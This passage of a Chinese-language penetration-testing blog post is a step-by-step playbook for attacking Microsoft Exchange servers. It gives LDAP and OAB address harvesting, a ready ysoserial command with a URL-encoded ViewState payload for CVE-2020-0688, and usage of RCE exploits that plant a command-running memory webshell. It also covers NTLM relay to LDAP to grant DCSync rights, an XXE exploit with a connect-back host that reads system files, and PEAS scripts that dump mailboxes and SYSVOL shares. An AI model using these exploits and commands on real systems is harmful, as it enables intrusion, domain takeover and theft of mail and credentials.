class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/autodiscover/autodiscover.xml</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>MAIL<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YmllamllbGU=<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;<br>&lt;Request&gt;&lt;EMailAddress&gt;daiker@Linton-Lab.com&lt;/EMailAddress&gt;<br>&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;<br>&lt;/Request&gt;&lt;/Autodiscover&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/article/123456.jpg" alt="图片"></p></li><li><p>读取OAB列表</p><p>访问OABUrl/oab.xml</p><p><img src="/img/article/1234567.jpg" alt="图片"></p></li><li><p>下载lzx文件</p><p>OABUrl/xx.lzx</p></li><li><p>解码lzx文件</p><p>oabextract：<a href="http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract">http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract</a></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">./oabextract 67a0647b-<span class="hljs-number">8218</span>-498c-<span class="hljs-number">91b4</span>-311d4cabd00c-data-<span class="hljs-number">1315.</span>lzx gal.oab<br>strings gal.oab|grep SMTP<br></code></pre></td></tr></table></figure><p>kali可直接使用</p></li></ol><h3 id="通过LDAP"><a href="#通过LDAP" class="headerlink" title="通过LDAP"></a>通过LDAP</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ldapsearch</span> -x -H ldap://<span class="hljs-number">192.168.1.1:389</span> -D <span class="hljs-string">&quot;CN=testa,CN=Users,DC=test,DC=com&quot;</span> -w DomainUser<span class="hljs-number">123</span>! -b <span class="hljs-string">&quot;DC=test,DC=com&quot;</span> |grep mail:<br></code></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h3><p>参见上一篇文章</p><ol><li><p>收集参数</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--validationkey</span> = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）<br><br><span class="hljs-attr">--validationalg</span> = SHA1（默认，漏洞产生原因）<br><br><span class="hljs-attr">--generator</span> = B97B4E27（基本默认）<br><br><span class="hljs-attr">--viewstateuserkey</span> = d673d1a4-<span class="hljs-number">1794</span>-<span class="hljs-number">403</span>e-ab96-e283ca880ef2（手工获取，变量，每次登陆都不一致）<br></code></pre></td></tr></table></figure></li><li><p>生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="hljs-string">&quot;calc.exe&quot;</span> --validationalg=<span class="hljs-string">&quot;SHA1&quot;</span> --validationkey=<span class="hljs-string">&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot;</span> --generator=<span class="hljs-string">&quot;B97B4E27&quot;</span> --viewstateuserkey=<span class="hljs-string">&quot;d673d1a4-1794-403e-ab96-e283ca880ef2&quot;</span> --isdebug --islegacy<br></code></pre></td></tr></table></figure></li><li><p>对payload进行url编码</p></li><li><p>地址</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://<span class="hljs-number">192.168.1.248</span>/ecp/default.aspx?__VIEWSTATEGENERATOR=B<span class="hljs-number">97</span>B<span class="hljs-number">4</span>E<span class="hljs-number">27</span>&amp;__VIEWSTATE=%<span class="hljs-number">2</span>FwEyhAYAAQAAAP%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">8</span>BAAAAAAAAAAwCAAAAXk<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>Qb<span class="hljs-number">3</span>dlclNoZWxsLkVkaXRvciwgVmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>zLjAuMC<span class="hljs-number">4</span>wLCBDdWx<span class="hljs-number">0</span>dXJlPW<span class="hljs-number">5</span>ldXRyYWwsIFB<span class="hljs-number">1</span>YmxpY<span class="hljs-number">0</span>tleVRva<span class="hljs-number">2</span>VuPTMxYmYzODU<span class="hljs-number">2</span>YWQzNjRlMzUFAQAAAEJNaWNyb<span class="hljs-number">3</span>NvZnQuVmlzdWFsU<span class="hljs-number">3</span>R<span class="hljs-number">1</span>ZGlvLlRleHQuRm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZy<span class="hljs-number">5</span>UZXh<span class="hljs-number">0</span>Rm<span class="hljs-number">9</span>ybWF<span class="hljs-number">0</span>dGluZ<span class="hljs-number">1</span>J<span class="hljs-number">1</span>blByb<span class="hljs-number">3</span>BlcnRpZXMBAAAAD<span class="hljs-number">0</span>ZvcmVncm<span class="hljs-number">91</span>bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY<span class="hljs-number">3</span>Rpb<span class="hljs-number">25</span>hcnkNCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>Imh<span class="hljs-number">0</span>dHA<span class="hljs-number">6</span>Ly<span class="hljs-number">9</span>zY<span class="hljs-number">2</span>hlbWFzLm<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">5</span>jb<span class="hljs-number">20</span>vd<span class="hljs-number">2</span>luZngvMjAwNi<span class="hljs-number">94</span>YW<span class="hljs-number">1</span>sL<span class="hljs-number">3</span>ByZXNlbnRhdGlvbiINCiAgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">6</span>eD<span class="hljs-number">0</span>iaHR<span class="hljs-number">0</span>cDovL<span class="hljs-number">3</span>NjaGVtYXMubWljcm<span class="hljs-number">9</span>zb<span class="hljs-number">2</span>Z<span class="hljs-number">0</span>LmNvbS<span class="hljs-number">93</span>aW<span class="hljs-number">5</span>meC<span class="hljs-number">8</span>yMDA<span class="hljs-number">2</span>L<span class="hljs-number">3</span>hhbWwiDQogIHhtbG<span class="hljs-number">5</span>zOlN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbT<span class="hljs-number">0</span>iY<span class="hljs-number">2</span>xyLW<span class="hljs-number">5</span>hbWVzcGFjZTpTeXN<span class="hljs-number">0</span>ZW<span class="hljs-number">07</span>YXNzZW<span class="hljs-number">1</span>ibHk<span class="hljs-number">9</span>bXNjb<span class="hljs-number">3</span>JsaWIiDQogIHhtbG<span class="hljs-number">5</span>zOkRpYWc<span class="hljs-number">9</span>ImNsci<span class="hljs-number">1</span>uYW<span class="hljs-number">1</span>lc<span class="hljs-number">3</span>BhY<span class="hljs-number">2</span>U<span class="hljs-number">6</span>U<span class="hljs-number">3</span>lzdGVtLkRpYWdub<span class="hljs-number">3</span>N<span class="hljs-number">0</span>aWNzO<span class="hljs-number">2</span>Fzc<span class="hljs-number">2</span>VtYmx<span class="hljs-number">5</span>PXN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbSI%<span class="hljs-number">2</span>BDQoJIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIgeDpLZXk<span class="hljs-number">9</span>IiIgT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>VHlwZSA<span class="hljs-number">9</span>ICJ<span class="hljs-number">7</span>IHg<span class="hljs-number">6</span>VHlwZSBEaWFnOlByb<span class="hljs-number">2</span>Nlc<span class="hljs-number">3</span>N<span class="hljs-number">9</span>IiBNZXRob<span class="hljs-number">2</span>ROYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gIlN<span class="hljs-number">0</span>YXJ<span class="hljs-number">0</span>IiA%<span class="hljs-number">2</span>BDQogICAgIDxPYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXIuTWV<span class="hljs-number">0</span>aG<span class="hljs-number">9</span>kUGFyYW<span class="hljs-number">1</span>ldGVycz<span class="hljs-number">4</span>NCiAgICAgICAgPFN<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BY<span class="hljs-number">2</span>FsYy<span class="hljs-number">5</span>leGU<span class="hljs-number">8</span>L<span class="hljs-number">1</span>N<span class="hljs-number">5</span>c<span class="hljs-number">3</span>RlbTpTdHJpbmc%<span class="hljs-number">2</span>BDQogICAgIDwvT<span class="hljs-number">2</span>JqZWN<span class="hljs-number">0</span>RGF<span class="hljs-number">0</span>YVByb<span class="hljs-number">3</span>ZpZGVyLk<span class="hljs-number">1</span>ldGhvZFBhcmFtZXRlcnM%<span class="hljs-number">2</span>BDQogICAgPC<span class="hljs-number">9</span>PYmplY<span class="hljs-number">3</span>REYXRhUHJvdmlkZXI%<span class="hljs-number">2</span>BDQo<span class="hljs-number">8</span>L<span class="hljs-number">1</span>Jlc<span class="hljs-number">291</span>cmNlRGljdGlvbmFyeT<span class="hljs-number">4</span>Lp<span class="hljs-number">73</span>ado<span class="hljs-number">0</span>NJN<span class="hljs-number">2</span>PSSnfOoN<span class="hljs-number">9</span>h<span class="hljs-number">4</span>H<span class="hljs-number">7</span>xCU%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure></li></ol><h3 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h3><p>由于cmdlet参数处理不当导致的rce，要求同样是普通用户凭证以及开启ecp接口</p><p>分析文章：<a href="https://www.anquanke.com/post/id/219091?from=timeline">https://www.anquanke.com/post/id/219091?from=timeline</a></p><p>poc：<a href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p><p>在g<strong>et_x</strong>ml函数下面输入想要执行的命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> poc.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;target_ip&gt;</span> &lt;user:pass&gt; <span class="hljs-symbol">&lt;cmd&gt;</span><br></code></pre></td></tr></table></figure><h3 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h3><p>依然需要一个普通用户权限，且只适用于exchange2010</p><p>exp：<a href="https://github.com/Airboi/CVE-2020-17144-EXP">https://github.com/Airboi/CVE-2020-17144-EXP</a></p><p>​          <a href="https://github.com/zcgonvh/CVE-2020-17144">https://github.com/zcgonvh/CVE-2020-17144</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">CVE-2020-17144 <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span><br></code></pre></td></tr></table></figure><p>执行完会生成内存马</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">target</span>]/ews/soap/?pass=命令<br></code></pre></td></tr></table></figure><p><img src="/img/article/12345678.jpg" alt="图片"></p><p>注：内存马默认监听80端口</p><h2 id="Exchange-SSRF"><a href="#Exchange-SSRF" class="headerlink" title="Exchange SSRF"></a>Exchange SSRF</h2><h3 id="relay至ews接口伪造任意用户"><a href="#relay至ews接口伪造任意用户" class="headerlink" title="relay至ews接口伪造任意用户"></a>relay至ews接口伪造任意用户</h3><p>exchange允许任何用户为推送订阅（Push Subscription）指定所需的URL，服务器将尝试向这一URL发送通知。这一漏洞之所以存在，是因为Exchange Server使用CredentialCache.DefaultCredentials进行连接：<br><img src="/img/article/123456789.jpg" alt="avatar"></p><p>  CredentialCache.DefaultCredentials 会使 exchange 将 net-ntlm（注意不是NTLM） 发送到攻击者服务器。且exchange默认如下注册表项</p>  <figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\D</span>isableLoopbackCheck = 1<br></code></pre></td></tr></table></figure><p>  并未开启relay_back检查，因此我们可以将NTLM返回exchange的ews接口用于http认证，我们可以在soap头里伪造任意用户<br>  <img src="/img/article/1234567890.jpg" alt="avatar"></p><ul><li>利用工具：<a href="https://github.com/WyAtu/CVE-2018-8581">https://github.com/WyAtu/CVE-2018-8581</a></li></ul><h3 id="Exchange-ACL提权"><a href="#Exchange-ACL提权" class="headerlink" title="Exchange ACL提权"></a>Exchange ACL提权</h3><p>exchange server默认对域内有WriteACL权限，可以添加ACL赋予用户dcsync权限</p><ul><li><p>全域dcsync需要权限，我们可以通过添加两条ACL来使用户获得权限：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">‘DS-Replication-Get-Changes’     = 1131f6aa<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br>‘DS-Replication-Get-Changes-All’ = 1131f6ad<span class="hljs-string">-9</span>c07<span class="hljs-string">-11</span>d1-f79f<span class="hljs-string">-00</span>c04fc2dcd2<br></code></pre></td></tr></table></figure><p><code>Exchange Windows Permissions,Exchange Trusted Subsystem</code> 组成员都具有Write-ACL权限，则exchange机器拥有添加ACL的权限，所以我们在拿到Exchange机器的http请求的时候，可以将请求Relay到Ldap。由于Relay到的服务端是Ldap,Ldap服务器的默认策略是协商签名，而不是强制签名。是否签名由客户端决定。在SSRF里面发起的请求是http协议，http协议是不要求进行签名。然后由于Exchange机器用户具备WriteACL权限，我们在域内给添加两条acl，acl的受托人可以是任意用户。从而使该用户具备Dcsync的权限。</p></li><li><p>利用工具：</p><ul><li><code>privexchange.py</code> : <a href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a></li><li><code>ntlmrelayx.py、secretsdump.py</code> : <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li></ul></li><li><p>攻击步骤：</p><ol><li>使用 <code>ntlmrelayx</code> 监听端口进行等待连接<br><img src="https://p3.ssl.qhimg.com/t01516372c096f87a37.png" alt="avatar"></li><li>发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知<br><img src="https://p3.ssl.qhimg.com/t017673212a17449f39.png" alt="avatar"></li><li>Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl<br><img src="https://p3.ssl.qhimg.com/t017f6e513d75746385.png" alt="avatar"></li><li>用户即拥有了dcsync权限</li></ol></li><li><p>继承利用工具：<a href="https://github.com/Ridter/Exchange2domain">https://github.com/Ridter/Exchange2domain</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Exchange2domain.py -ah 10.211.55.2 -u sanfeng -p 1qaz@WSX -d cgdomain.com -th 10.211.55.200 10.211.55.201<br></code></pre></td></tr></table></figure></li></ul><h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h2><p>这不是excahnge的漏洞，而是利用了windows ntlm mic（完整性检测）的缺陷，修改ntlm认证包中的签名字段，使smb协议中继不校验签名。</p><p>不使用前文中的http协议中继，而是使用SpoolService发起smb请求，通过修改ntlm认证包，强制中继到LDAP。</p><p>同样是利用writeacl的问题更改用户权限。</p><p><a href="https://www.freebuf.com/vuls/206169.html">https://www.freebuf.com/vuls/206169.html</a></p><h2 id="Exchange-XXE"><a href="#Exchange-XXE" class="headerlink" title="Exchange  XXE"></a>Exchange  XXE</h2><h3 id="CVE-2020-17141"><a href="#CVE-2020-17141" class="headerlink" title="CVE-2020-17141"></a>CVE-2020-17141</h3><p>脚本：<a href="http://47.75.197.183/ss/exchange_xxe.py">http://47.75.197.183/ss/exchange_xxe.py</a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">/poc.py <span class="hljs-params">&lt;target&gt;</span> <span class="hljs-params">&lt;user:pass&gt;</span> <span class="hljs-params">&lt;connectback ip:port（内网IP和端口）&gt;</span>  <span class="hljs-params">&lt;file&gt;</span><br>cve<span class="hljs-number">-2020</span><span class="hljs-number">-17141.</span>py  <span class="hljs-number">192.168</span><span class="hljs-number">.75</span><span class="hljs-number">.142</span>   harryh@exchangedemo.com:user123<span class="hljs-meta"># 192.168.75.1:9090 <span class="hljs-string">&quot;C:/windows/win.ini&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/article/typora-user-images%5Cimage-20210103210935948.png" alt="image-20210103210935948"></p><p>需要删除多于参数：<code>X-OWA-UrlPostData </code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">GetWacIframeUrlForOneDrive</span><br></code></pre></td></tr></table></figure><h2 id="Exchange-Activesync"><a href="#Exchange-Activesync" class="headerlink" title="Exchange Activesync"></a>Exchange Activesync</h2><p>Exchange ActiveSync是一种Microsoft Exchange同步协议，该协议经过优化，以适用于高延迟和低宽带网络。</p><p>该协议基于HTTP和XML，使移动设备可以访问其电子邮件、日历、联系人和任务，并且在脱机工作时仍可以继续访问这些信息。</p><p>简单理解，计算机用户通过owa(Outlook Web Access)访问邮件资源，手机用户通过eas(Exchange ActiveSync)访问邮件资源</p><ul><li><p>利用工具：<a href="https://github.com/FSecureLABS/peas">https://github.com/FSecureLABS/peas</a></p><ul><li><p>验证凭据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><br><span class="hljs-comment"># Check the credentials are accepted.</span><br>print(<span class="hljs-string">&quot;Auth result:&quot;</span>, client.check_auth())<br></code></pre></td></tr></table></figure></li><li><p>读取邮件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> peas<br><span class="hljs-keyword">import</span> re<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><span class="hljs-comment"># Retrieve emails.</span><br>emails = client.extract_emails()<br><span class="hljs-keyword">for</span> email <span class="hljs-keyword">in</span> emails :<br>    print(<span class="hljs-string">&quot;\r\n&quot;</span>)  <br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:To&gt;(.*?)&lt;/email:To&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;To:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:From&gt;(.*?)&lt;/email:From&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;From:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Subject&gt;(.*?)&lt;/email:Subject&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Subject:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:DateReceived&gt;(.*?)&lt;/email:DateReceived&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;DateReceived:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:DisplayTo&gt;(.*?)&lt;/email:DisplayTo&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;DisplayTo:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:ThreadTopic&gt;(.*?)&lt;/email:ThreadTopic&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;ThreadTopic:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Importance&gt;(.*?)&lt;/email:Importance&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Importance:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email:Read&gt;(.*?)&lt;/email:Read&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;Read:&quot;</span>+data[<span class="hljs-number">0</span>])<br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;airsyncbase:DisplayName&gt;(.*?)&lt;/airsyncbase:DisplayName&gt;&quot;</span>)<br>    <br>    data = pattern_data.findall(email)<br>    <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> data :<br>        print(<span class="hljs-string">&quot;Attachment:&quot;</span>+name)<br>  <br>    pattern_data = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;email2:ConversationIndex&gt;(.*?)&lt;/email2:ConversationIndex&gt;&quot;</span>)<br>    data = pattern_data.findall(email)<br>    print(<span class="hljs-string">&quot;ConversationIndex:&quot;</span>+data[<span class="hljs-number">0</span>])<br><br>    index1 = email.find(<span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span>)<br>    index2 = email.find(<span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span>)<br>    filename = data[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;.html&quot;</span><br>    print(<span class="hljs-string">&#x27;[+] Save body to %s&#x27;</span>%(filename))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;w+&#x27;</span>) <span class="hljs-keyword">as</span> file_object:<br>            file_object.write(email[index1:index2+<span class="hljs-number">7</span>]) <br></code></pre></td></tr></table></figure></li><li><p>访问文件共享:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 列出共享文件：</span><br><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span class="hljs-string">&#x27;server&#x27;</span>: <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;test1&#x27;</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456789&#x27;</span>,<br>&#125;)<br><span class="hljs-comment"># Retrieve a file share directory listing.</span><br>listing = client.get_unc_listing(<span class="hljs-string">r&#x27;\\dc1\SYSVOL&#x27;</span>)<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> listing :<br>   print(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>   <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> data.items():<br>      print(<span class="hljs-string">&#x27;&#123;key&#125;:&#123;value&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key = key, value = value))<br></code></pre></td></tr></table></figure></li><li><p>读取指定共享文件内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取指定共享文件内容</span><br><span class="hljs-keyword">import</span> peas<br><span class="hljs-comment"># Create an instance of the PEAS client.</span><br>client = peas.Peas()<br><span class="hljs-comment"># Disable certificate verification so self-signed certificates don&#x27;t cause errors.</span><br>client.disable_certificate_verification()<br><span class="hljs-comment"># Set the credentials and server to connect to.</span><br>client.set_creds(&#123;<br>    <span 